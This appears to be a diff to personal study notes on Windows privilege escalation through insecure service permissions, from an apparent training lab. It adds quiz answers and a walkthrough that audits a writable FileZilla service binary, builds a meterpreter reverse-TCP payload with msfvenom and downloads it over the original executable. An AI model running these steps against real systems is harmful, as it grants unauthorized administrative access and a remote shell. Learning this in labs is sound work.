@@ -100,4 +100,33 @@ Insecure Service Permission
 Which of the following would NOT be a common method for exploiting insecure service permissions? > Replacing the service's log files to obscure malicious activity.
 
 Which type of permission, if set insecurely, poses a significant risk for privilege escalation when inspecting the ACLs of a Windows service? > Write
+
+C:> . .\PowerUp.ps1
+C:> Invoke-PrivescAudit
+
+ServiceName                     : FileZilla Server
+Path                            : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
+ModifiableFile                  : C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+
+FileZilla service > FileZilla.exe can be modified 
+
+C:> Get-ACL "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe" | format-list
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe
+Owner  : BUILTIN\Administrators
+Group  : PRIV-ESC\None
+Access : PRIV-ESC\student Allow  FullControl
+
+Student user has full control
+
+Create FileZilla Server.exe reverse payload
+#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.33.4 LPORT=2222 -f exe > 'FileZilla Server.exe'
+
+
+Download and replace the original FileZilla Server.exe place
+-------------------------------------------------------------
+iwr -UseBasicParsing -Uri 'http://10.10.21.2/FileZilla Server.exe' -Outfile  "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
+
+
 _________________________________________________________________________________________________________________________________________________________________________________________
